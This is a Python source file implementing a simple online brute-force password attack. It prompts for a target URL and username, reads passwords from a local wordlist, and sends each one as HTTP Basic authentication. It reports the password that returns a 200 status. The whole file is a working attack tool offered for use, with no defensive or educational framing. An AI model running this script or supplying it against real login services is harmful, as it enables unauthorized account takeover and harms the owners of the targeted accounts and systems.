import requests
import os
import re

class BruteForce:
    def __init__(self, target_url, username, wordlist_path):
        """
        Initialize the BruteForce class with necessary parameters.
        :param target_url: The URL of the login form or service.
        :param username: The username to attempt to brute force (if needed).
        :param wordlist_path: Path to the wordlist file containing possible passwords.
        """
        if not self.validate_url(target_url):
            raise ValueError(f"Invalid URL: {target_url}")
        
        self.target_url = target_url
        self.username = username
        self.wordlist_path = wordlist_path

    def validate_url(self, url):
        """
        Validate the URL to ensure it's a properly formatted HTTP or HTTPS URL.
        :param url: The URL to validate.
        :return: True if the URL is valid, False otherwise.
        """
        url_regex = re.compile(
            r'^(https?://)'
            r'(([A-Za-z0-9-]+\.)+[A-Za-z]{2,6})'
            r'(:[0-9]{1,5})?'
            r'(/.*)?$', re.IGNORECASE)
        return url_regex.match(url) is not None

    def run(self):
        """
        Run the brute force attack using the provided wordlist.
        """
        print(f"Running Brute Force Attack on {self.target_url} with username {self.username}...")

        try:
            with open(self.wordlist_path, 'r') as file:
                passwords = file.read().splitlines()

            for password in passwords:
                print(f"Trying password: {password}")

                auth = (self.username, password)
                response = requests.get(self.target_url, auth=auth)

                if response.status_code == 200:
                    print(f"[+] Password found: {password}")
                    break
                else:
                    print(f"[-] Password incorrect: {password}")

            else:
                print("[!] Brute force attack failed. No valid password found.")

        except FileNotFoundError:
            print(f"[-] Wordlist file not found: {self.wordlist_path}")
        except requests.RequestException as e:
            print(f"[-] Request error: {e}")
        except Exception as e:
            print(f"[-] An unexpected error occurred: {e}")


if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., http://example.com/login): ")
    username = input("Enter the username: ")

    wordlist_path = os.path.join('resources', 'password_wordlist.txt')

    try:
        brute_force = BruteForce(target_url, username, wordlist_path)
        brute_force.run()
    except ValueError as e:
        print(e)
